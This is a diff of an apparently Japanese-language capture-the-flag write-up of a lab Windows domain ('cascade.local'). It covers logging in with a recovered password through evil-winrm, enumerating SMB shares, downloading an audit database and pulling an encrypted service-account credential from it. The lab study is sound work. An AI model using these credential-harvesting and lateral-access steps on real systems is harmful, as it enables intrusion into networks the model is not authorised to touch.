@@ -342,7 +342,7 @@ SMB         10.129.188.71   445    NONE             [-] cascade.local\j.allen:sT
 ```
 step2でも確認したとおり、s.smithは「Remote Management Users」のメンバーであったためwinrmでログイン成功！  
 ユーザフラグゲット
-```sh
+```powershell
 └─$ evil-winrm -i 10.129.188.71 -u s.smith -p sT333ve2
                                         
 Evil-WinRM shell v3.7
@@ -358,47 +358,33 @@ Info: Establishing connection to remote endpoint
 
 
 ## STEP 4
+s.smithでsmb列挙、STEP3と比較してAudit$が読み取り可能になっている
 ```sh
-└─$ smbclient -U 'cascade.local/s.smith%sT333ve2' -c 'recurse ON; dir' //10.129.195.221/Audit$
-  .                                   D        0  Wed Jan 29 13:01:26 2020
-  ..                                  D        0  Wed Jan 29 13:01:26 2020
-  CascAudit.exe                      An    13312  Tue Jan 28 16:46:51 2020
-  CascCrypto.dll                     An    12288  Wed Jan 29 13:00:20 2020
-  DB                                  D        0  Tue Jan 28 16:40:59 2020
-  RunAudit.bat                        A       45  Tue Jan 28 18:29:47 2020
-  System.Data.SQLite.dll              A   363520  Sun Oct 27 02:38:36 2019
-  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 02:38:38 2019
-  x64                                 D        0  Sun Jan 26 17:25:27 2020
-  x86                                 D        0  Sun Jan 26 17:25:27 2020
-
-\DB
-  .                                   D        0  Tue Jan 28 16:40:59 2020
-  ..                                  D        0  Tue Jan 28 16:40:59 2020
-  Audit.db                           An    24576  Tue Jan 28 16:39:24 2020
-
-\x64
-  .                                   D        0  Sun Jan 26 17:25:27 2020
-  ..                                  D        0  Sun Jan 26 17:25:27 2020
-  SQLite.Interop.dll                  A  1639936  Sun Oct 27 02:39:20 2019
-
-\x86
-  .                                   D        0  Sun Jan 26 17:25:27 2020
-  ..                                  D        0  Sun Jan 26 17:25:27 2020
-  SQLite.Interop.dll                  A  1246720  Sun Oct 27 02:34:20 2019
-
-                6553343 blocks of size 4096. 1664656 blocks available
+└─$ netexec smb 10.129.188.71 -u s.smith -p sT333ve2 --shares 
+SMB         10.129.188.71  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) 
+SMB         10.129.188.71  445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
+SMB         10.129.188.71  445    CASC-DC1         [*] Enumerated shares
+SMB         10.129.188.71  445    CASC-DC1         Share           Permissions     Remark
+SMB         10.129.188.71  445    CASC-DC1         -----           -----------     ------
+SMB         10.129.188.71  445    CASC-DC1         ADMIN$                          Remote Admin
+SMB         10.129.188.71  445    CASC-DC1         Audit$          READ            
+SMB         10.129.188.71  445    CASC-DC1         C$                              Default share
+SMB         10.129.188.71  445    CASC-DC1         Data            READ            
+SMB         10.129.188.71  445    CASC-DC1         IPC$                            Remote IPC
+SMB         10.129.188.71  445    CASC-DC1         NETLOGON        READ            Logon server share 
+SMB         10.129.188.71  445    CASC-DC1         print$          READ            Printer Drivers
+SMB         10.129.188.71  445    CASC-DC1         SYSVOL          READ            Logon server share
 ```
-```sh
-└─$ netexec smb 10.129.195.221 -u s.smith -p sT333ve2 --share Audit$ --get-file 'RunAudit.bat' '/home/kali/RunAudit.bat'
-SMB         10.129.195.221  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) 
-SMB         10.129.195.221  445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
-SMB         10.129.195.221  445    CASC-DC1         [*] Copying "RunAudit.bat" to "/home/kali/RunAudit.bat"
-SMB         10.129.195.221  445    CASC-DC1         [+] File "RunAudit.bat" was downloaded to "/home/kali/RunAudit.bat"
-                                                                                                                                                                                
-└─$ cat ../RunAudit.bat                                            
-CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
-```
-```sh
+winrm上でAudit$にアクセス  
+net shareコマンドが拒否られたので、レジストリでAudit$のパス確認、移動
+```powershell
+*Evil-WinRM* PS C:\Users\s.smith\Documents> net share
+net.exe : System error 5 has occurred.
+    + CategoryInfo          : NotSpecified: (System error 5 has occurred.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+
+Access is denied.
+
 *Evil-WinRM* PS C:\Users\s.smith\Documents> reg query "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares"
 
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares
@@ -409,4 +395,130 @@ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares
     Audit$    REG_MULTI_SZ    CSCFlags=0\0MaxUses=4294967295\0Path=C:\Shares\Audit\0Permissions=9\0ShareName=Audit$\0Type=0
 
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares\Security
+
+*Evil-WinRM* PS C:\Users\s.smith\Documents> cd C:\Shares\Audit\
+*Evil-WinRM* PS C:\Shares\Audit> 
 ```
+Audit$内を確認  
+CascAudit.exeやCascCrypto.dllはググっても何のファイルかは不明、自作ファイル？
+```powershell
+*Evil-WinRM* PS C:\Shares\Audit> ls -R
+
+
+    Directory: C:\Shares\Audit
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        1/28/2020   9:40 PM                DB
+d-----        1/26/2020  10:25 PM                x64
+d-----        1/26/2020  10:25 PM                x86
+-a----        1/28/2020   9:46 PM          13312 CascAudit.exe
+-a----        1/29/2020   6:00 PM          12288 CascCrypto.dll
+-a----        1/28/2020  11:29 PM             45 RunAudit.bat
+-a----       10/27/2019   6:38 AM         363520 System.Data.SQLite.dll
+-a----       10/27/2019   6:38 AM         186880 System.Data.SQLite.EF6.dll
+
+
+    Directory: C:\Shares\Audit\DB
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        1/28/2020   9:39 PM          24576 Audit.db
+
+
+    Directory: C:\Shares\Audit\x64
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       10/27/2019   6:39 AM        1639936 SQLite.Interop.dll
+
+
+    Directory: C:\Shares\Audit\x86
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       10/27/2019   6:34 AM        1246720 SQLite.Interop.dll
+```
+batを確認、CascAudit.exeを実行している  
+実際にbatを動かしてもdbファイルが見つからなそうな感じだったので、  
+CascAudit.exeにdbを指定して実行  
+dbファイルに書き込みしている挙動だが、読み込み専用なのでうまくいってはなさそう
+```powershell
+*Evil-WinRM* PS C:\Shares\Audit> cat RunAudit.bat
+CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
+
+*Evil-WinRM* PS C:\Shares\Audit> .\RunAudit.bat
+
+C:\Shares\Audit>CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
+Error getting LDAP connection data From database: unable to open database file
+
+*Evil-WinRM* PS C:\Shares\Audit> .\CascAudit.exe DB\Audit.db
+Found 2 results from LDAP query
+CascAudit.exe : 
+    + CategoryInfo          : NotSpecified: (:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+Unhandled Exception: System.Data.SQLite.SQLiteException: attempt to write a readonly database
+attempt to write a readonly database
+   at System.Data.SQLite.SQLite3.Reset(SQLiteStatement stmt)
+   at System.Data.SQLite.SQLite3.Step(SQLiteStatement stmt)
+   at System.Data.SQLite.SQLiteDataReader.NextResult()
+   at System.Data.SQLite.SQLiteDataReader..ctor(SQLiteCommand cmd, CommandBehavior behave)
+   at System.Data.SQLite.SQLiteCommand.ExecuteReader(CommandBehavior behavior)
+   at System.Data.SQLite.SQLiteCommand.ExecuteNonQuery(CommandBehavior behavior)
+   at CascAudiot.MainModule.Main()
+Successfully inserted 0 row(s) into database
+```
+dbファイルを調査するためダウンロード
+```sh
+└─$ netexec smb 10.129.188.71 -u s.smith -p sT333ve2 --share Audit$ --get-file 'DB\Audit.db' '/home/kali/Audit.db'
+SMB         10.129.188.71  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) 
+SMB         10.129.188.71  445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
+SMB         10.129.188.71  445    CASC-DC1         [*] Copying "DB\Audit.db" to "/home/kali/Audit.db"
+SMB         10.129.188.71  445    CASC-DC1         [+] File "DB\Audit.db" was downloaded to "/home/kali/Audit.db"
+```
+dbファイルをオープン  
+Ldapテーブルにクレデンシャルのようなものを発見  
+しかしパスワードスプレーをしてもログインできず、またbase系でデコードも文字化けしたのでデコードできず
+```sh
+└─$ sqlite3 Audit.db      
+SQLite version 3.46.1 2024-08-13 09:16:08
+Enter ".help" for usage hints.
+sqlite>
+
+sqlite> .tables
+DeletedUserAudit  Ldap              Misc            
+
+sqlite> .mode column
+
+sqlite> SELECT * FROM DeletedUserAudit;
+Id  Username   Name                                      DistinguishedName                                           
+--  ---------  ----------------------------------------  ------------------------------------------------------------
+6   test       Test                                      CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Delete
+               DEL:ab073fbd91-4fd1-b877-817b9e1b0e6d  d Objects,DC=cascade,DC=local                               
+
+7   deleted    deleted guy                               CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN
+               DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef  =Deleted Objects,DC=cascade,DC=local                        
+
+9   TempAdmin  TempAdmin                                 CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=D
+               DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a  eleted Objects,DC=cascade,DC=local                          
+
+sqlite> SELECT * FROM Ldap;
+Id  uname   pwd                       domain       
+--  ------  ------------------------  -------------
+1   ArkSvc  BQO5l5Kj9MdErXx6Q6AGOw==  cascade.local
+
+sqlite> SELECT * FROM Misc;
+
+```
+もういちど
+
+```sh
+└─$ smbclient -U 'cascade.local/s.smith%sT333ve2' -c 'recurse ON; dir' //10.129.188.71/Audit$
+
+
+```
+
